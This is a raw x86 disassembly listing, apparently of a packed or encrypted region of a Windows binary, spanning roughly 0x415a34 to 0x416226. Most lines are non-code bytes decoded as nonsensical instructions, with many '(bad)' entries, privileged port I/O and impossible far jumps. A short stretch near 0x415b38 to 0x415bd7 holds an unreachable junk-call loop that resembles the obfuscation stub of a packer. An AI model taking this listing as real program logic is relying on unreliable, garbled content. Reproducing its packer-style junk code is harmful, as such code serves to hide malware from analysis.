  415a34:	cmp    esp,DWORD PTR [edx+0x13b91e1e]
  415a3a:	std    
  415a3b:	mov    ds:0xcf81b72f,eax
  415a40:	je     0x4159e5
  415a42:	mov    ch,0x9c
  415a44:	or     dh,dh
  415a46:	push   0xc9193659
  415a4b:	cmp    DWORD PTR [ebp-0x6d],0xffffffce
  415a4f:	inc    ecx
  415a50:	jnp    0x415ab9
  415a52:	push   ebp
  415a53:	(bad)  
  415a54:	outs   dx,DWORD PTR ds:[esi]
  415a55:	shr    BYTE PTR [esi-0xc],0xdf
  415a59:	(bad)  
  415a5a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415a5b:	sti    
  415a5c:	mov    ch,0x13
  415a5e:	or     ebp,ebx
  415a60:	sahf   
  415a61:	adc    bh,BYTE PTR [edi+0x38c630d5]
  415a67:	in     al,dx
  415a68:	mov    ebx,0x2b671d14
  415a6d:	in     al,0xf0
  415a6f:	push   eax
  415a70:	or     dl,BYTE PTR ds:0x7f165b31
  415a76:	dec    esp
  415a77:	jp     0x415a23
  415a79:	dec    esi
  415a7a:	out    dx,eax
  415a7b:	cs aad 0x2d
  415a7e:	pop    ecx
  415a7f:	xchg   ebp,eax
  415a80:	cmc    
  415a81:	or     DWORD PTR ds:0x82ab3f7e,edx
  415a87:	push   esp
  415a88:	cld    
  415a89:	add    DWORD PTR [ebp+0x47acc43d],0x7e
  415a90:	aaa    
  415a91:	lods   eax,DWORD PTR ds:[esi]
  415a92:	in     eax,0xab
  415a94:	xor    bl,BYTE PTR [esi+edi*4+0x7ab3210]
  415a9b:	fcom   QWORD PTR [ebx+0x46eeea01]
  415aa1:	mov    al,ds:0x91cd7287
  415aa6:	retf   
  415aa7:	inc    edi
  415aa8:	rcl    BYTE PTR [eax],0xcb
  415aab:	pop    ecx
  415aac:	bound  ecx,QWORD PTR [esi]
  415aae:	mov    ds:0xdbcfa027,al
  415ab3:	mov    al,ds:0xb9fff13d
  415ab8:	mov    al,ds:0x25c8b9df
  415abd:	or     edx,DWORD PTR [ebx+0x56]
  415ac0:	fs (bad) 
  415ac2:	sti    
  415ac3:	xchg   ebp,eax
  415ac4:	lds    ecx,FWORD PTR [eax-0x13]
  415ac7:	mov    ebx,0x89de5b6c
  415acc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415acd:	loopne 0x415a97
  415acf:	pop    esp
  415ad0:	les    esi,FWORD PTR [ebx+0x36]
  415ad3:	data16 arpl WORD PTR [edi+0x38e91ebe],cx
  415ada:	leave  
  415adb:	repz sub ebx,DWORD PTR [edx-0x77002776]
  415ae2:	das    
  415ae3:	mov    esp,0x57616ace
  415ae8:	outs   dx,BYTE PTR ds:[esi]
  415ae9:	sub    eax,0x2cf3389b
  415aee:	push   eax
  415aef:	rol    DWORD PTR [edi],cl
  415af1:	(bad)  
  415af2:	(bad)  
  415af3:	out    dx,al
  415af4:	es mov es,esi
  415af7:	hlt    
  415af8:	adc    DWORD PTR [edi-0x221b1771],eax
  415afe:	retf   
  415aff:	(bad)  
  415b00:	jmp    0x415b6f
  415b02:	and    DWORD PTR [eax-0x8],eax
  415b05:	aad    0xdb
  415b07:	mov    dl,BYTE PTR [eax+0x4e6fdf70]
  415b0d:	das    
  415b0e:	xor    ch,bl
  415b10:	out    dx,al
  415b11:	pop    ss
  415b12:	(bad)  
  415b13:	enter  0x4978,0x10
  415b17:	pop    esp
  415b18:	scas   al,BYTE PTR es:[edi]
  415b19:	sbb    BYTE PTR [edi-0x7c0192fc],dh
  415b1f:	ins    BYTE PTR es:[edi],dx
  415b20:	add    BYTE PTR [eax-0x61242207],al
  415b26:	mov    eax,ds:0xa939127b
  415b2b:	cwde   
  415b2c:	inc    edi
  415b2d:	push   0x68
  415b2f:	xchg   ebp,eax
  415b30:	outs   dx,BYTE PTR ds:[esi]
  415b31:	sete   BYTE PTR ds:0x69ff960f
  415b38:	mov    edx,DWORD PTR [ebp+0xc]
  415b3b:	xor    edx,esi
  415b3d:	mov    BYTE PTR [edx+eax*1+0x3272db],cl
  415b44:	mov    eax,DWORD PTR [ebp+0xc]
  415b47:	xor    eax,esi
  415b49:	add    eax,edi
  415b4b:	pop    edi
  415b4c:	pop    esi
  415b4d:	pop    ebx
  415b4e:	leave  
  415b4f:	ret    0x8
  415b52:	push   ebp
  415b53:	mov    ebp,esp
  415b55:	push   ecx
  415b56:	and    DWORD PTR ds:0x42701c,0x0
  415b60:	jmp    0x415b70
  415b65:	mov    eax,ds:0x42701c
  415b6a:	inc    eax
  415b6b:	mov    ds:0x42701c,eax
  415b70:	cmp    DWORD PTR ds:0x42701c,0x1b
  415b77:	jae    0x415bbd
  415b7d:	cmp    DWORD PTR ds:0x42701c,0x25
  415b84:	jne    0x415bb8
  415b8a:	push   0x5668
  415b8f:	push   DWORD PTR [ebp-0x24]
  415b92:	push   DWORD PTR [ebp-0x10]
  415b95:	push   DWORD PTR [ebp-0x20]
  415b98:	push   0x7cb6
  415b9d:	push   DWORD PTR [ebp-0x24]
  415ba0:	push   0x559a
  415ba5:	push   0x4b12
  415baa:	push   0x6519
  415baf:	push   DWORD PTR [ebp-0x28]
  415bb2:	call   DWORD PTR ds:0x421030
  415bb8:	jmp    0x415b65
  415bbd:	mov    DWORD PTR [ebp-0x4],0xf89c85b6
  415bc4:	adc    DWORD PTR ds:0x428008,ecx
  415bca:	mov    eax,DWORD PTR [ebp+0x8]
  415bcd:	add    DWORD PTR ds:0x425010,0x223f
  415bd7:	jmp    0x417f24
  415bdc:	into   
  415bdd:	or     al,0x6c
  415bdf:	jg     0x415c4d
  415be1:	fild   QWORD PTR [ebp-0x75]
  415be4:	dec    ebx
  415be5:	mov    ebp,0x35e918bc
  415bea:	iret   
  415beb:	bound  ecx,QWORD PTR ds:0x52626147
  415bf1:	pop    edi
  415bf2:	bound  esp,QWORD PTR [edx+0x7d]
  415bf5:	push   0x157fecaf
  415bfa:	es dec esp
  415bfc:	mov    dh,0xe2
  415bfe:	ds sub al,0x26
  415c01:	bnd jae 0x415c2d
  415c04:	das    
  415c05:	scas   al,BYTE PTR es:[edi]
  415c06:	out    dx,eax
  415c07:	in     eax,0xc1
  415c09:	ins    BYTE PTR es:[edi],dx
  415c0a:	sub    al,BYTE PTR [ecx]
  415c0c:	stos   BYTE PTR es:[edi],al
  415c0d:	mov    ss,WORD PTR [eax+0x66dc1d75]
  415c13:	(bad)  
  415c15:	sub    ecx,esp
  415c17:	mov    BYTE PTR [ebx-0x70],0xec
  415c1b:	scas   eax,DWORD PTR es:[edi]
  415c1c:	int    0x2
  415c1e:	aad    0x29
  415c20:	push   edi
  415c21:	add    DWORD PTR [edi-0x18],esp
  415c24:	out    0xd3,al
  415c26:	push   0xfffffff8
  415c28:	mov    eax,edi
  415c2a:	mov    ebp,0x71ff17f0
  415c2f:	jp     0x415c2f
  415c31:	stc    
  415c32:	dec    ebx
  415c33:	mov    ecx,0x86e9af2d
  415c38:	leave  
  415c39:	sbb    DWORD PTR [ecx+0x591ccb1e],0x31
  415c40:	xchg   edx,eax
  415c41:	aas    
  415c42:	xchg   edi,eax
  415c43:	(bad)  
  415c44:	mov    edi,0x7a8ad4f9
  415c49:	and    eax,0xc09c8dc0
  415c4e:	inc    edi
  415c4f:	inc    eax
  415c50:	cmp    al,0x78
  415c52:	shr    DWORD PTR [eax-0x677b0089],cl
  415c58:	sub    DWORD PTR [edi+0x77],edx
  415c5b:	(bad)  
  415c5c:	jp     0x415c6d
  415c5e:	pop    esi
  415c5f:	push   ds
  415c60:	loop   0x415c3e
  415c62:	push   ecx
  415c63:	int    0x7c
  415c65:	jo     0x415cb8
  415c67:	(bad)  
  415c68:	(bad)  
  415c69:	mov    WORD PTR cs:[eax+edi*8],?
  415c6d:	hlt    
  415c6e:	cmc    
  415c6f:	mov    dl,0x1
  415c71:	mov    ah,0x2c
  415c73:	push   ss
  415c74:	cmp    al,0xd8
  415c76:	cmp    ebx,DWORD PTR [eax+0x62]
  415c79:	mov    bh,0x72
  415c7b:	push   esp
  415c7c:	adc    DWORD PTR [esi+0x34440188],0xffffffab
  415c83:	imul   BYTE PTR [edi+eax*2-0x3e30564]
  415c8a:	push   ebx
  415c8b:	ret    
  415c8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c8d:	cmp    BYTE PTR [edx-0x3faff093],dh
  415c93:	repnz xchg ebx,eax
  415c95:	jp     0x415c60
  415c97:	cli    
  415c98:	or     esi,DWORD PTR [edi]
  415c9a:	shl    DWORD PTR [ebp+0xdbb37fe],cl
  415ca0:	jle    0x415c43
  415ca2:	adc    DWORD PTR [ecx],edx
  415ca4:	pop    ecx
  415ca5:	jbe    0x415cfb
  415ca7:	or     BYTE PTR [ebp+0x4cd613a9],ah
  415cad:	xchg   DWORD PTR [edx-0x5ae17510],esp
  415cb3:	push   ds
  415cb4:	retf   0xec99
  415cb7:	fmul   QWORD PTR [eax]
  415cb9:	cmp    al,0xfb
  415cbb:	repz sub dl,BYTE PTR [ebp-0x24dd0052]
  415cc2:	inc    ebp
  415cc3:	ret    0xb494
  415cc6:	jnp    0x415c59
  415cc8:	push   0x93c3cf71
  415ccd:	gs jb  0x415c61
  415cd0:	aad    0x3
  415cd2:	fistp  QWORD PTR [ebp-0x7007aecf]
  415cd8:	popf   
  415cd9:	out    0xcb,eax
  415cdb:	sbb    BYTE PTR [esi+0x1aed6e2c],bl
  415ce1:	es pushf 
  415ce3:	es sbb al,0x19
  415ce6:	daa    
  415ce7:	out    dx,al
  415ce8:	lods   al,BYTE PTR ds:[esi]
  415ce9:	dec    edi
  415cea:	pop    ebx
  415ceb:	push   dx
  415ced:	cmp    eax,DWORD PTR [ebx-0x6b]
  415cf0:	mov    ebp,0x64cb4c22
  415cf5:	sub    bl,BYTE PTR [ebx+edi*4+0x21d40b38]
  415cfc:	jge    0x415d24
  415cfe:	pop    edi
  415cff:	adc    ecx,DWORD PTR [ebx]
  415d01:	hlt    
  415d02:	std    
  415d03:	popa   
  415d04:	xchg   ecx,eax
  415d05:	cmp    DWORD PTR [esi+ebp*1-0xe],ebx
  415d09:	cmp    eax,0x6841d81b
  415d0e:	std    
  415d0f:	imul   edx,DWORD PTR [eax-0x7a6b9ffe],0x6add002e
  415d19:	cwde   
  415d1a:	ja     0x415ccf
  415d1c:	repz push cs
  415d1e:	mov    ecx,0x5d588940
  415d23:	mov    ecx,0x7311cc09
  415d28:	sbb    BYTE PTR [eax-0x1387537],dl
  415d2e:	jno    0x415d62
  415d30:	lods   eax,DWORD PTR ds:[esi]
  415d31:	shl    BYTE PTR [edx+0x3acd9e2e],1
  415d37:	daa    
  415d38:	test   al,0x20
  415d3a:	daa    
  415d3b:	rcr    eax,0x8a
  415d3e:	or     DWORD PTR [edx+0x5c],ebp
  415d41:	push   ss
  415d42:	cmc    
  415d43:	push   0xd9d8fde8
  415d48:	xchg   edi,eax
  415d49:	mov    cl,0x46
  415d4b:	sbb    ebp,DWORD PTR [eax+ecx*4+0x6c]
  415d4f:	clc    
  415d50:	ficom  WORD PTR ds:0xced46c1f
  415d56:	fiadd  DWORD PTR [ecx-0x44]
  415d59:	xor    esi,DWORD PTR [esi+0x8]
  415d5c:	xor    ch,BYTE PTR [edi+0x64810503]
  415d62:	mov    ebp,esi
  415d64:	pop    DWORD PTR gs:[edi]
  415d67:	mov    eax,ds:0x12e9a17f
  415d6c:	hlt    
  415d6d:	push   0x24f5bbef
  415d72:	xor    bh,cl
  415d74:	sbb    ch,al
  415d76:	jmp    0x415d97
  415d78:	pop    ebp
  415d79:	loop   0x415d17
  415d7b:	add    al,0x5e
  415d7d:	jmp    0x415d7c
  415d7f:	ins    DWORD PTR es:[edi],dx
  415d80:	xlat   BYTE PTR ds:[ebx]
  415d81:	push   edi
  415d82:	test   DWORD PTR [edx-0x81395c1],esi
  415d88:	and    bh,BYTE PTR [ecx]
  415d8a:	xor    BYTE PTR [eax+0x14],bh
  415d8d:	ja     0x415df3
  415d8f:	xor    ch,BYTE PTR [ebp-0x4e639cea]
  415d95:	loopne 0x415d6f
  415d97:	icebp  
  415d98:	xchg   edx,eax
  415d99:	test   eax,0x589e70db
  415d9e:	adc    BYTE PTR [ebx],al
  415da0:	or     esp,ebp
  415da2:	push   cs
  415da3:	(bad)  
  415da4:	push   ebp
  415da5:	mov    al,0x26
  415da7:	push   0x55e0385d
  415dac:	lea    edi,[ebp-0x38295c28]
  415db2:	sub    al,0x3b
  415db4:	shl    DWORD PTR [ebx],0x37
  415db7:	aam    0x3f
  415db9:	nop
  415dba:	pop    ss
  415dbb:	jo     0x415d64
  415dbd:	jge    0x415db7
  415dbf:	mov    ebp,0xd3135790
  415dc4:	jg     0x415e25
  415dc6:	test   eax,0x515570fd
  415dcb:	push   DWORD PTR [ecx]
  415dcd:	sub    eax,0x18fb50a4
  415dd2:	mov    bh,0xae
  415dd4:	hlt    
  415dd5:	js     0x415d6f
  415dd7:	loopne 0x415dac
  415dd9:	ss xor eax,0xd0d45f46
  415ddf:	ins    DWORD PTR es:[edi],dx
  415de0:	adc    BYTE PTR [edx+0x52],al
  415de3:	gs xor dh,bl
  415de6:	cmp    bl,bh
  415de8:	test   BYTE PTR [esi],0xe0
  415deb:	inc    edi
  415dec:	jb     0x415dea
  415dee:	inc    edx
  415def:	clc    
  415df0:	mul    BYTE PTR ds:0x610f97d6
  415df6:	popf   
  415df7:	push   0x3a738431
  415dfc:	shr    BYTE PTR [esi-0x18],0x2c
  415e00:	xor    al,0xb5
  415e02:	cli    
  415e03:	add    ecx,eax
  415e05:	arpl   WORD PTR [ecx-0xc6bff5f],ax
  415e0b:	stos   DWORD PTR es:[edi],eax
  415e0c:	fs or  ax,si
  415e10:	pop    ecx
  415e11:	scas   al,BYTE PTR es:[edi]
  415e12:	add    BYTE PTR [ecx],bh
  415e14:	xchg   ecx,eax
  415e15:	mov    DWORD PTR [edx-0x65],esi
  415e18:	loop   0x415dc2
  415e1a:	idiv   BYTE PTR [ebx-0x67467447]
  415e20:	lock mov ch,0x78
  415e23:	jmp    0x44ac6b87
  415e28:	sti    
  415e29:	push   ebp
  415e2a:	(bad)  
  415e2b:	stos   BYTE PTR es:[edi],al
  415e2c:	mov    edi,ebx
  415e2e:	xor    edx,ebx
  415e30:	bound  ebp,QWORD PTR [esi-0x14]
  415e33:	(bad)  
  415e34:	test   al,0x72
  415e36:	loopne 0x415ea8
  415e38:	dec    edx
  415e39:	xlat   BYTE PTR ds:[ebx]
  415e3a:	fbstp  TBYTE PTR [ebx+0x2a]
  415e3d:	repnz outs dx,BYTE PTR ds:[esi]
  415e3f:	sub    eax,ebp
  415e41:	ss loopne 0x415e8c
  415e44:	popa   
  415e45:	mov    bh,0x74
  415e47:	jle    0x415e40
  415e49:	xchg   edx,eax
  415e4a:	(bad)  
  415e4b:	cmp    BYTE PTR [esi],al
  415e4d:	push   cs
  415e4e:	push   ds
  415e4f:	inc    ebp
  415e50:	push   cs
  415e51:	ss call 0x6279:0x810247ce
  415e59:	dec    eax
  415e5a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415e5b:	jnp    0x415e9b
  415e5d:	in     al,dx
  415e5e:	push   0xffffffd7
  415e60:	mov    ch,0xf4
  415e62:	mov    eax,ds:0xac60f3c7
  415e67:	sbb    eax,0x7ed2a444
  415e6c:	mov    ds:0xb9955df2,eax
  415e71:	pop    ebx
  415e72:	cmp    DWORD PTR [ebp+ecx*4-0x7fbe81aa],ebp
  415e79:	xlat   BYTE PTR ds:[ebx]
  415e7a:	sti    
  415e7b:	dec    eax
  415e7c:	test   DWORD PTR [esi],eax
  415e7e:	and    eax,0xd1a1931
  415e83:	jae    0x415e5c
  415e85:	inc    ecx
  415e86:	mov    bh,0x5c
  415e88:	and    al,0xd5
  415e8a:	sub    eax,0xe175a7b6
  415e8f:	leave  
  415e90:	leave  
  415e91:	in     eax,0xc4
  415e93:	and    bh,BYTE PTR [esi]
  415e95:	mov    bl,0x4f
  415e97:	lock fstp DWORD PTR [edx-0x6941a909]
  415e9e:	dec    ebp
  415e9f:	sbb    ebp,DWORD PTR [edi-0x74b6a4f4]
  415ea5:	and    DWORD PTR [eax+0x35cfa1be],esp
  415eab:	scas   al,BYTE PTR es:[edi]
  415eac:	call   0xe1bda2c9
  415eb1:	fnstsw WORD PTR [edi]
  415eb3:	in     eax,0xa6
  415eb5:	xlat   BYTE PTR ds:[ebx]
  415eb6:	mov    esi,0x15eaec82
  415ebb:	ins    DWORD PTR es:[edi],dx
  415ebc:	dec    ebx
  415ebd:	(bad)  
  415ebe:	sub    DWORD PTR ds:0x66bd90f6,ebx
  415ec5:	mov    esp,0x68e48fd7
  415eca:	xor    eax,0xa671f574
  415ecf:	lds    edi,FWORD PTR [eax]
  415ed1:	inc    edi
  415ed2:	xor    dh,BYTE PTR [eax]
  415ed4:	aad    0x9f
  415ed6:	stos   DWORD PTR es:[edi],eax
  415ed7:	pop    ebp
  415ed8:	fstp   DWORD PTR [edx-0x27]
  415edb:	add    al,0xe5
  415edd:	scas   eax,DWORD PTR es:[edi]
  415ede:	test   BYTE PTR [ebx+0x53823bdf],0xa0
  415ee5:	gs cmp edi,ecx
  415ee8:	adc    DWORD PTR cs:[ecx-0x54],eax
  415eec:	fdiv   DWORD PTR [ebx+esi*8+0x55593397]
  415ef3:	inc    esi
  415ef4:	(bad)
  415ef8:	xchg   ecx,eax
  415ef9:	retf   0x615b
  415efc:	inc    ebp
  415efd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415efe:	jns    0x415ec4
  415f00:	lods   eax,DWORD PTR ds:[esi]
  415f01:	mov    ah,0x6d
  415f03:	xchg   edx,eax
  415f04:	das    
  415f05:	lock push ss
  415f07:	xchg   edx,eax
  415f08:	ror    dh,1
  415f0a:	je     0x415f7d
  415f0c:	(bad)  
  415f0d:	lods   al,BYTE PTR ds:[esi]
  415f0e:	int    0x44
  415f10:	in     eax,0x59
  415f12:	jecxz  0x415f49
  415f14:	icebp  
  415f15:	lods   eax,DWORD PTR ds:[esi]
  415f16:	pop    edi
  415f17:	mov    ds:0x52b6ff1f,eax
  415f1c:	pop    es
  415f1d:	inc    ebp
  415f1e:	retf   
  415f1f:	cs mov dl,0x8f
  415f22:	add    bl,bh
  415f24:	and    BYTE PTR [ebx+0x7c],ch
  415f27:	fistp  WORD PTR [edi]
  415f29:	mov    esp,0xa3356488
  415f2e:	pop    edx
  415f2f:	scas   al,BYTE PTR es:[edi]
  415f30:	(bad)  
  415f31:	dec    esi
  415f32:	fadd   QWORD PTR [ebp-0x4e]
  415f35:	push   esp
  415f36:	in     al,0x9b
  415f38:	sub    DWORD PTR ds:0xff8919bc,ebx
  415f3e:	inc    eax
  415f3f:	out    0x4,eax
  415f41:	xor    bl,dh
  415f43:	mov    al,ds:0x486bc7a7
  415f48:	mov    bl,dh
  415f4a:	mov    ebp,DWORD PTR [ebx-0x31153d70]
  415f50:	test   DWORD PTR [ebx],edi
  415f52:	test   eax,0x61187374
  415f57:	or     DWORD PTR [eax-0x2d],edx
  415f5a:	mul    BYTE PTR [ecx+0x1023ef0]
  415f60:	inc    ecx
  415f61:	inc    eax
  415f62:	(bad)  
  415f63:	mov    fs,WORD PTR [edi+ebx*4+0x1a7422e]
  415f6a:	mov    eax,ds:0x5dc27694
  415f6f:	out    0xbc,al
  415f71:	loopne 0x415fa9
  415f73:	push   edi
  415f74:	popa   
  415f75:	gs jae 0x415f39
  415f78:	clc    
  415f79:	mov    bl,0x2b
  415f7b:	pop    ss
  415f7c:	mov    edx,0xf4a25906
  415f81:	std    
  415f82:	push   eax
  415f83:	repz mov ecx,0xa95fd8db
  415f89:	jno    0x415fdf
  415f8b:	shl    BYTE PTR [esi-0x70cbe8e5],cl
  415f91:	ja     0x415f5d
  415f93:	add    DWORD PTR [edx],eax
  415f95:	xlat   BYTE PTR ds:[ebx]
  415f96:	mov    al,0x40
  415f98:	ret    
  415f99:	mov    edi,0x605c44c4
  415f9e:	mov    fs,WORD PTR [eax-0x34b3a54d]
  415fa4:	or     ah,BYTE PTR [esi+0x45]
  415fa7:	enter  0x434a,0xa5
  415fab:	mov    ds:0xd49a58b3,al
  415fb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415fb1:	jge    0x415f9d
  415fb3:	popf   
  415fb4:	pusha  
  415fb5:	jns    0x415f4a
  415fb7:	jmp    0xdb6:0xaa9e9265
  415fbe:	sub    cl,BYTE PTR [edi]
  415fc0:	dec    ebx
  415fc1:	std    
  415fc2:	xchg   edx,eax
  415fc3:	inc    esp
  415fc4:	fxch   st(5)
  415fc6:	jnp    0x41603a
  415fc8:	dec    eax
  415fc9:	push   ebp
  415fca:	clc    
  415fcb:	push   0xd9103a97
  415fd0:	cmp    al,0xff
  415fd2:	push   es
  415fd3:	lds    ebp,FWORD PTR [edi-0x680360de]
  415fd9:	add    dh,ch
  415fdb:	cdq    
  415fdc:	push   esp
  415fdd:	pop    ebx
  415fde:	jg     0x41601a
  415fe0:	js     0x415f76
  415fe2:	sti    
  415fe3:	bound  esi,QWORD PTR [eax+0x611b3967]
  415fe9:	(bad)
  415fed:	cs xor eax,0x285ba360
  415ff3:	les    esi,FWORD PTR [edx+0x5a]
  415ff6:	jno    0x415fc6
  415ff8:	fsubr  st(1),st
  415ffa:	mov    dh,BYTE PTR [esi]
  415ffc:	lods   al,BYTE PTR ds:[esi]
  415ffd:	cmc    
  415ffe:	ins    DWORD PTR es:[edi],dx
  415fff:	imul   ecx,DWORD PTR [esi],0xffffffd2
  416002:	sub    BYTE PTR [esi-0x3a],dh
  416005:	into   
  416006:	pushf  
  416007:	jne    0x415fe0
  416009:	fst    st(0)
  41600b:	add    ecx,DWORD PTR ds:0x55fb57db
  416011:	sub    eax,0xc6238c4c
  416016:	jge    0x41607c
  416018:	repz fcmovbe st,st(3)
  41601b:	in     eax,dx
  41601c:	cwde   
  41601d:	xchg   ch,bh
  41601f:	mov    bl,0xaf
  416021:	ror    DWORD PTR [edi+eiz*4+0x247d1055],1
  416028:	jp     0x415ff4
  41602a:	ins    DWORD PTR es:[edi],dx
  41602b:	jnp    0x41609f
  41602d:	icebp  
  41602e:	xchg   esi,eax
  41602f:	mov    cl,0xb5
  416031:	and    ebp,DWORD PTR [edi-0x5235184e]
  416037:	jbe    0x416088
  416039:	pop    es
  41603a:	inc    eax
  41603b:	pop    ebx
  41603c:	or     BYTE PTR [eax-0x519357d2],0xf4
  416043:	xchg   edx,eax
  416044:	fsub   QWORD PTR [ecx+0x16729065]
  41604a:	lds    ecx,FWORD PTR [ecx-0x2bea7982]
  416050:	sbb    eax,0xa74bae66
  416055:	add    BYTE PTR [eax+0x29379520],ah
  41605b:	mov    ebp,0x55065aa7
  416060:	xor    BYTE PTR [eax-0x1b12bba5],ah
  416066:	pop    ebp
  416067:	call   0x5c20:0x3dbe062
  41606e:	sar    BYTE PTR ds:0x9cceb801,0x20
  416075:	and    bl,BYTE PTR [ebx-0x2a]
  416078:	jecxz  0x41601c
  41607a:	daa    
  41607b:	aas    
  41607c:	inc    ecx
  41607d:	jno    0x416078
  41607f:	retf   
  416080:	cld    
  416081:	jge    0x416029
  416083:	dec    esi
  416084:	fild   WORD PTR [edi]
  416086:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416088:	or     al,0x9e
  41608a:	or     al,0x56
  41608c:	loop   0x4160d9
  41608e:	enter  0x9aac,0xc5
  416092:	push   0x47
  416094:	mov    edx,0x777feeef
  416099:	loopne 0x41609c
  41609b:	je     0x416108
  41609d:	dec    ebx
  41609e:	inc    ebp
  41609f:	mov    bl,0x10
  4160a1:	les    ebx,FWORD PTR [esi-0x59]
  4160a4:	add    BYTE PTR [esi],cl
  4160a6:	cmc    
  4160a7:	pop    esp
  4160a8:	xchg   ecx,eax
  4160a9:	add    dh,ah
  4160ab:	sub    BYTE PTR [esp+edi*2],0x8d
  4160af:	popa   
  4160b0:	repz inc ebp
  4160b2:	(bad)  
  4160b3:	(bad)  
  4160b4:	mov    al,0xea
  4160b6:	adc    DWORD PTR [edi+0x3c],0xffffff95
  4160ba:	xlat   BYTE PTR ds:[ebx]
  4160bb:	xor    BYTE PTR [eax+eiz*8],0x6e
  4160bf:	out    0xd6,eax
  4160c1:	retf   
  4160c2:	das    
  4160c3:	sar    ebp,0x60
  4160c6:	add    eax,0x591920f9
  4160cb:	cmp    eax,0x14687cf4
  4160d0:	jl     0x41607a
  4160d2:	ror    esp,cl
  4160d4:	inc    esp
  4160d5:	push   ss
  4160d6:	or     edx,0x80168337
  4160dc:	shl    DWORD PTR [ebx],1
  4160de:	adc    al,0x3b
  4160e0:	retf   
  4160e1:	cmp    ch,BYTE PTR [ebx-0x21]
  4160e4:	repnz fwait
  4160e6:	add    eax,0xf5c2ae79
  4160eb:	jo     0x416120
  4160ed:	jecxz  0x416117
  4160ef:	cld    
  4160f0:	sahf   
  4160f1:	or     BYTE PTR [ebx+0x19df7188],0x95
  4160f8:	sub    al,0x34
  4160fa:	push   ebx
  4160fb:	or     bl,dl
  4160fd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4160fe:	fnstsw WORD PTR [ecx-0x2c1d6968]
  416104:	(bad)  
  416105:	int    0xbd
  416107:	mov    WORD PTR [edi],?
  416109:	inc    esp
  41610a:	and    ax,0x4c98
  41610e:	xchg   esp,eax
  41610f:	xlat   BYTE PTR ds:[ebx]
  416110:	scas   eax,DWORD PTR es:[edi]
  416111:	push   edx
  416112:	fisttp DWORD PTR [edx+0x3]
  416115:	mov    bl,0xa7
  416117:	sbb    esi,eax
  416119:	or     al,0xb6
  41611b:	adc    DWORD PTR [eax],esi
  41611d:	fisubr DWORD PTR [bp+si-0x4e7c]
  416122:	ds stos BYTE PTR es:[edi],al
  416124:	sar    DWORD PTR [esp+eiz*2+0x410154f8],cl
  41612b:	dec    ecx
  41612c:	jmp    0x4160e3
  41612e:	cdq    
  41612f:	lods   al,BYTE PTR ds:[esi]
  416130:	mov    ch,al
  416132:	mov    cl,0xc9
  416134:	dec    ecx
  416135:	iret   
  416136:	jl     0x41610a
  416138:	sbb    BYTE PTR [ecx+0x21],dl
  41613b:	sar    DWORD PTR [edi+0x4ea8d46a],cl
  416141:	or     al,al
  416143:	pop    ss
  416144:	lock (bad) 
  416147:	aad    0x19
  416149:	dec    ebp
  41614a:	jg     0x416190
  41614c:	sub    DWORD PTR [eax],ebx
  41614e:	pop    ebp
  41614f:	retf   
  416150:	lahf   
  416151:	idiv   BYTE PTR [edi+0x33ee605]
  416157:	ds std 
  416159:	adc    bh,0x8d
  41615c:	mov    edx,0x12d4eea0
  416161:	mov    eax,0xde951b5
  416166:	rcr    BYTE PTR [ebp+0x35fa2ade],cl
  41616c:	mov    edx,0xcd688aa2
  416171:	ins    BYTE PTR es:[edi],dx
  416172:	lods   al,BYTE PTR ds:[esi]
  416173:	fiadd  WORD PTR [edi]
  416175:	data16 fucomip st,st(0)
  416178:	pushf  
  416179:	xor    al,0xf6
  41617b:	push   0xffffff96
  41617d:	test   al,0x23
  41617f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416180:	push   0x64ff1b85
  416185:	adc    DWORD PTR [eax-0x262a22f6],esi
  41618b:	popf   
  41618c:	xchg   esi,eax
  41618d:	push   esp
  41618e:	mov    eax,0x564b16ae
  416194:	cmp    ecx,DWORD PTR [ebp+0x164e27b3]
  41619a:	inc    edx
  41619b:	pop    edi
  41619c:	cld    
  41619d:	cwde   
  41619e:	test   bh,0xdd
  4161a1:	sti    
  4161a2:	hlt    
  4161a3:	into   
  4161a4:	stc    
  4161a5:	jmp    0x4161c2
  4161a7:	fs inc edi
  4161a9:	(bad)  
  4161aa:	pop    ds
  4161ab:	lods   eax,DWORD PTR ds:[esi]
  4161ac:	shr    ebx,1
  4161ae:	bound  edx,QWORD PTR [eax+0x3c]
  4161b1:	push   esp
  4161b2:	push   ss
  4161b3:	(bad)  
  4161b5:	out    0xf8,al
  4161b7:	cmp    esp,DWORD PTR [esi]
  4161b9:	pop    esi
  4161ba:	mov    ch,0xb8
  4161bc:	mov    al,ds:0x15689b87
  4161c1:	pusha  
  4161c2:	arpl   WORD PTR [ebp-0x175dc2d4],bx
  4161c8:	std    
  4161c9:	jno    0x4161b5
  4161cb:	iret   
  4161cc:	dec    edx
  4161cd:	adc    dh,bl
  4161cf:	inc    ebp
  4161d0:	fstp   DWORD PTR [esi+0x4d8b38b2]
  4161d6:	add    BYTE PTR [ecx+0x44],dl
  4161d9:	outs   dx,DWORD PTR ds:[esi]
  4161da:	jl     0x416241
  4161dc:	sti    
  4161dd:	pop    es
  4161de:	pushf  
  4161df:	mov    edx,0x7315238d
  4161e4:	fmul   st(0),st
  4161e6:	ss pop edi
  4161e8:	push   ss
  4161e9:	sbb    DWORD PTR ds:0xa7ec6bf9,edi
  4161ef:	imul   esp,eax,0xba370641
  4161f5:	and    al,0x57
  4161f7:	xchg   ebx,eax
  4161f8:	jmp    0x4161dd
  4161fa:	clc    
  4161fb:	push   cs
  4161fc:	hlt    
  4161fd:	in     al,0x70
  4161ff:	add    DWORD PTR [eiz*8+0x57de9675],0xffffff9f
  416207:	xor    ch,BYTE PTR [ebx+0x188d6eff]
  41620d:	inc    ebp
  41620e:	push   edi
  41620f:	add    al,0xf8
  416211:	mov    ebp,0x7f631ce9
  416216:	push   edx
  416217:	mov    eax,0x4cd79e0e
  41621c:	xchg   ebx,eax
  41621d:	and    al,0x29
  41621f:	xchg   ebx,eax
  416220:	cwde   
  416221:	aam    0x16
  416223:	xlat   BYTE PTR ds:[ebx]
  416224:	nop
  416225:	pushf  
  416226:	mov    eax,ds:0xcf8c5dd3
